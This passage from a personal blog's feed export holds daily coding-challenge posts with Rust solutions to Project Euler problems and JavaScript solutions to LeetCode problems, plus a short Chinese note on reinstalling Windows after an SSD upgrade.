class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"><span class="keyword">use</span> std::string::<span class="built_in">ToString</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> LIMIT: <span class="built_in">usize</span> = <span class="number">1_000_000</span>;</span><br><span class="line">    <span class="keyword">let</span> sieve: Sieve = Sieve::new(LIMIT);</span><br><span class="line">    <span class="keyword">let</span> count = sieve.prime_pi(LIMIT) + <span class="number">1usize</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..count &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> num = sieve.nth_prime(i);</span><br><span class="line">        <span class="keyword">let</span> l = num.to_string().len();</span><br><span class="line">        <span class="keyword">let</span> base = <span class="number">10usize</span>.pow(l <span class="keyword">as</span> <span class="built_in">u32</span> - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// println!("&#123;&#125;,&#123;&#125;",num,base);</span></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> is_ok = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> _i <span class="keyword">in</span> <span class="number">1</span>..l &#123;</span><br><span class="line">            num = num / base + num % base * <span class="number">10</span>;</span><br><span class="line">            <span class="comment">// println!("&#123;&#125;",num);</span></span><br><span class="line">            <span class="keyword">if</span> !sieve.is_prime(num) &#123;</span><br><span class="line">                is_ok = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> is_ok &#123;</span><br><span class="line">            ans += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="313-Super-Ugly-Number"><a href="#313-Super-Ugly-Number" class="headerlink" title="313. Super Ugly Number"></a>313. Super Ugly Number</h3><p>Medium</p><p>Write a program to find the <code>nth</code> super ugly number.</p><p>Super ugly numbers are positive numbers whose all prime factors are in the given prime list <code>primes</code> of size <code>k</code>.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 12, primes = [2,7,13,19]</span><br><span class="line">Output: 32 </span><br><span class="line">Explanation: [1,2,4,7,8,13,14,16,19,26,28,32] is the sequence of the first 12 </span><br><span class="line">             super ugly numbers given primes = [2,7,13,19] of size 4.</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ul><li><code>1</code> is a super ugly number for any given <code>primes</code>.</li><li>The given numbers in <code>primes</code> are in ascending order.</li><li>0 &lt; <code>k</code> ≤ 100, 0 &lt; <code>n</code> ≤ 1e6, 0 &lt; <code>primes[i]</code> &lt; 1000.</li><li>The nth super ugly number is guaranteed to fit in a 32-bit signed integer.</li></ul><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>One way to solve it is priority queue, but ES6 doesn&#39;t have it.</p><p>Another way is use a array to maintain every position which primes should multiply.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; n</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; primes</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> nthSuperUglyNumber = <span class="function"><span class="keyword">function</span>(<span class="params">n, primes</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> pos = <span class="keyword">new</span> <span class="built_in">Array</span>(primes.length).fill(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">let</span> ugly = [<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    <span class="keyword">let</span> mn = <span class="built_in">Number</span>.MAX_SAFE_INTEGER;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; primes.length; ++j) &#123;</span><br><span class="line">      mn = <span class="built_in">Math</span>.min(mn, primes[j] * ugly[pos[j]]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; primes.length; ++j)&#123;</span><br><span class="line">      <span class="keyword">if</span> (!(mn%primes[j]))</span><br><span class="line">        ++pos[j];</span><br><span class="line">    &#125;</span><br><span class="line">    ugly[i] = mn;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ugly[n<span class="number">-1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(nthSuperUglyNumber(n = 12, primes = [2,7,13,19]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-23 Daily Challenge</title>
      <link href="/2019-01-23-Daily-Challenge/"/>
      <url>/2019-01-23-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Digit factorials</em> in <em>Rust</em> and <em>Search a 2D Matrix II</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Digit-factorials"><a href="#Digit-factorials" class="headerlink" title="Digit factorials"></a>Digit factorials</h3><h3 id="Problem-34"><a href="#Problem-34" class="headerlink" title="Problem 34"></a>Problem 34</h3><p>145 is a curious number, as 1! + 4! + 5! = 1 + 24 + 120 = 145.</p><p>Find the sum of all numbers which are equal to the sum of the factorial of their digits.</p><p>Note: as 1! = 1 and 2! = 2 are not sums they are not included.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Simple DFS is capabel for this problem.</p><p>Because 9!*7 &lt; 9e7, so number limit will be 6.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">Vec</span>&lt;<span class="built_in">i64</span>&gt; = <span class="built_in">Vec</span>::new();</span><br><span class="line">    dfs(<span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;<span class="keyword">mut</span> ans);</span><br><span class="line">    ans.sort();</span><br><span class="line">    ans.dedup();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans_sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> &amp;ans &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, num);</span><br><span class="line">        ans_sum += num;       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans_sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">dfs</span></span>(c: <span class="built_in">i64</span>, n: <span class="built_in">i64</span>, num: <span class="built_in">i64</span>, sum: <span class="built_in">i64</span>, ans: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;<span class="built_in">i64</span>&gt;)&#123;</span><br><span class="line">    <span class="keyword">if</span> sum == num &amp;&amp; sum &gt; <span class="number">2</span> &#123;</span><br><span class="line">        ans.push(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> c &gt; n &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0i64</span>..<span class="number">10i64</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">0</span> &amp;&amp; i == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dfs(c+<span class="number">1</span>, n, num*<span class="number">10</span> + i, sum + factorial(i), ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">factorial</span></span>(i: <span class="built_in">i64</span>) -&gt; <span class="built_in">i64</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..(i+<span class="number">1</span>) &#123;</span><br><span class="line">        tmp *= j;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="240-Search-a-2D-Matrix-II"><a href="#240-Search-a-2D-Matrix-II" class="headerlink" title="240. Search a 2D Matrix II"></a>240. Search a 2D Matrix II</h3><p>Write an efficient algorithm that searches for a value in an <em>m</em> x <em>n</em> matrix. This matrix has the following properties:</p><ul><li>Integers in each row are sorted in ascending from left to right.</li><li>Integers in each column are sorted in ascending from top to bottom.</li></ul><p><strong>Example:</strong></p><p>Consider the following matrix:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [1,   4,  7, 11, 15],</span><br><span class="line">  [2,   5,  8, 12, 19],</span><br><span class="line">  [3,   6,  9, 16, 22],</span><br><span class="line">  [10, 13, 14, 17, 24],</span><br><span class="line">  [18, 21, 23, 26, 30]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Given target = <code>5</code>, return <code>true</code>.</p><p>Given target = <code>20</code>, return <code>false</code>.</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simple simulation.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[][]&#125; matrix</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; target</span></span><br><span class="line"><span class="comment"> * @return &#123;boolean&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> searchMatrix = <span class="function"><span class="keyword">function</span>(<span class="params">matrix, target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!matrix.length || !matrix[<span class="number">0</span>].length || target &lt; matrix[<span class="number">0</span>][<span class="number">0</span>]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">let</span> row = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> col = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> m = matrix.length;</span><br><span class="line">  <span class="keyword">while</span> (row &lt; m &amp;&amp; col &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (target === matrix[row][col]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; matrix[row][col]) --col;</span><br><span class="line">    <span class="keyword">else</span> ++row;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-22 Daily Challenge</title>
      <link href="/2019-01-22-Daily-Challenge/"/>
      <url>/2019-01-22-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Digit cancelling fractions</em> in <em>Rust</em> and <em>Repeated String Match</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Digit-cancelling-fractions"><a href="#Digit-cancelling-fractions" class="headerlink" title="Digit cancelling fractions"></a>Digit cancelling fractions</h3><h3 id="Problem-33"><a href="#Problem-33" class="headerlink" title="Problem 33"></a>Problem 33</h3><p>The fraction 49/98 is a curious fraction, as an inexperienced mathematician in attempting to simplify it may incorrectly believe that 49/98 = 4/8, which is correct, is obtained by cancelling the 9s.</p><p>We shall consider fractions like, 30/50 = 3/5, to be trivial examples.</p><p>There are exactly four non-trivial examples of this type of fraction, less than one in value, and containing two digits in the numerator and denominator.</p><p>If the product of these four fractions is given in its lowest common terms, find the value of the denominator.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> numerator = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> denominator = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">9</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i+<span class="number">1</span>..<span class="number">10</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (i*<span class="number">10</span> + k)*j == (k*<span class="number">10</span> + j)*i &#123;</span><br><span class="line">                    <span class="built_in">println!</span>(<span class="string">"&#123;&#125;/&#123;&#125; = &#123;&#125;/&#123;&#125;"</span>,i*<span class="number">10</span>+k,k*<span class="number">10</span>+j,i,j);</span><br><span class="line">                    numerator *= i;</span><br><span class="line">                    denominator *= j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, denominator/gcd(denominator, numerator));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">gcd</span></span>(a: <span class="built_in">usize</span>, b: <span class="built_in">usize</span>) -&gt; <span class="built_in">usize</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> b == <span class="number">0</span> &#123; a &#125; <span class="keyword">else</span> &#123; gcd(b, a%b) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="686-Repeated-String-Match"><a href="#686-Repeated-String-Match" class="headerlink" title="686. Repeated String Match"></a>686. Repeated String Match</h3><p>Given two strings A and B, find the minimum number of times A has to be repeated such that B is a substring of it. If no such solution, return -1.</p><p>For example, with A = &quot;abcd&quot; and B = &quot;cdabcdab&quot;.</p><p>Return 3, because by repeating A three times (“abcdabcdabcd”), B is a substring of it; and B is not a substring of A repeated two times (&quot;abcdabcd&quot;).</p><p><strong>Note:</strong><br>The length of <code>A</code> and <code>B</code> will be between 1 and 10000.</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; A</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; B</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> repeatedStringMatch = <span class="function"><span class="keyword">function</span>(<span class="params">A, B</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> nstr = A;</span><br><span class="line">  <span class="keyword">while</span>(nstr.length &lt; B.length) nstr += A;</span><br><span class="line">  <span class="keyword">return</span> nstr.indexOf(B) !== <span class="number">-1</span> ? <span class="built_in">Math</span>.ceil(B.length/A.length):((nstr+A).indexOf(B) === <span class="number">-1</span>? <span class="number">-1</span>:<span class="built_in">Math</span>.ceil(B.length/A.length)+<span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(repeatedStringMatch("abcd","cdabcdab"));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>又一次装机</title>
      <link href="/%E5%8F%88%E4%B8%80%E6%AC%A1%E8%A3%85%E6%9C%BA/"/>
      <url>/%E5%8F%88%E4%B8%80%E6%AC%A1%E8%A3%85%E6%9C%BA/</url>
      <content type="html"><![CDATA[<p>更新了固态硬盘，所以又要重装电脑啦~<br>记录一蛤装机过程，主要还是给自己以后参考用。<br><a id="more"></a></p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>到<a href="https://www.microsoft.com/software-download/windows10" target="_blank" rel="noopener">Download Windows 10 Disc Image (ISO File) - Microsoft</a>下载创建安装盘的工具</p><p>到电脑厂商官网/硬件厂商官网下载驱动。</p><p>使用GeekUninstaller导出一份软件清单，并且按照清单下载安装程序（假如没有留下来的）。</p><p>查看Path里有没有什么需要配置的东西，保留ssh私钥。</p><p>测试驱动包会干些什么（别再给我搞个什么电脑管家我就艹了）</p><p>代码、浏览器都不用备份，我使用OneDrive/Chrome解决迁移问题（同步真是好，但是涉密千万别上网）。</p><p>UWP应用虽好，但是不一定在清单里，记得备份一下列表。</p><p>有注册的软件记得注销/记录注册码。</p><p>单机游戏记得备份存档，云存档不用。各个工具的设置如果能导出的话导一下。</p><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><p>安装过程就是反着来就是了。</p><p>顺便一提这次加了内存换了SSD，国产软件基本都丢虚拟机里了。</p><p>目前来看暂时没有想到什么值得一提的东西，可能是因为比较习惯了吧。</p>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>2019-01-21 Daily Challenge</title>
      <link href="/2019-01-21-Daily-Challenge/"/>
      <url>/2019-01-21-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Pandigital products</em> in <em>Rust</em> and <em>Candy</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Pandigital-products"><a href="#Pandigital-products" class="headerlink" title="Pandigital products"></a>Pandigital products</h3><h3 id="Problem-32"><a href="#Problem-32" class="headerlink" title="Problem 32"></a>Problem 32</h3><p>We shall say that an n-digit number is pandigital if it makes use of all the digits 1 to n exactly once; for example, the 5-digit number, 15234, is 1 through 5 pandigital.</p><p>The product 7254 is unusual, as the identity, 39 × 186 = 7254, containing multiplicand, multiplier, and product is 1 through 9 pandigital.</p><p>Find the sum of all products whose multiplicand/multiplier/product identity can be written as a 1 through 9 pandigital.</p><p>HINT: Some products can be obtained in more than one way so be sure to only include it once in your sum.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Because there are nine digits, so multiplication will be $a\times bcde=fghi$ or $ab\times cde=fghi$.</p><p>But apart from brute force approach, I can&#39;t find another solution.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashSet;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> set: HashSet&lt;<span class="built_in">i32</span>&gt; = HashSet::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1234</span>..<span class="number">9877</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> i*j &gt; <span class="number">9999</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> check(i, j, i*j) &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">"&#123;&#125; * &#123;&#125; = &#123;&#125;"</span>, i, j, i*j);</span><br><span class="line">                set.insert(i*j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">12</span>..<span class="number">99</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">123</span>..<span class="number">988</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> i*j &gt; <span class="number">9999</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> check(i, j, i*j) &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">"&#123;&#125; * &#123;&#125; = &#123;&#125;"</span>, i, j, i*j);</span><br><span class="line">                set.insert(i*j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> set &#123;</span><br><span class="line">        ans += num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">check</span></span>(<span class="keyword">mut</span> multiplicand: <span class="built_in">i32</span>, <span class="keyword">mut</span> multiplier: <span class="built_in">i32</span>, <span class="keyword">mut</span> product: <span class="built_in">i32</span>) -&gt; <span class="built_in">bool</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ok: [<span class="built_in">bool</span>; <span class="number">10</span>] = [<span class="literal">false</span>; <span class="number">10</span>];</span><br><span class="line">    <span class="keyword">while</span> multiplicand &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = multiplicand % <span class="number">10</span>;</span><br><span class="line">        multiplicand /= <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span> || ok[tmp <span class="keyword">as</span> <span class="built_in">usize</span>] &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ok[tmp <span class="keyword">as</span> <span class="built_in">usize</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> multiplier &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = multiplier % <span class="number">10</span>;</span><br><span class="line">        multiplier /= <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span> || ok[tmp <span class="keyword">as</span> <span class="built_in">usize</span>] 